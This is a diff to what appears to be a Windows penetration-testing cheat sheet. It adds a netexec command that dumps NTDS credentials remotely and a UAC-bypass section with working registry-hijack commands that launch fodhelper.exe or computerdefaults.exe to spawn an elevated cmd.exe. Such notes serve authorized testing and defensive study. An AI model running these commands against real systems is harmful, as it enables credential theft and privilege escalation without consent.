@@ -112,6 +112,7 @@ Dumping LSA/SAM remotely:
 ```
 > netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --lsa
 > netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --sam
+> netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --ntdsutil
 ```
 
 Extracting hash from LSASS memory
@@ -326,3 +327,10 @@ Use the hash to crack password
  - JAWS: PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0
  - Watson: Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.
  - Windows Exploit Suggester - Next Generation: WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported
+
+BypassUAC 
+
+```
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+```
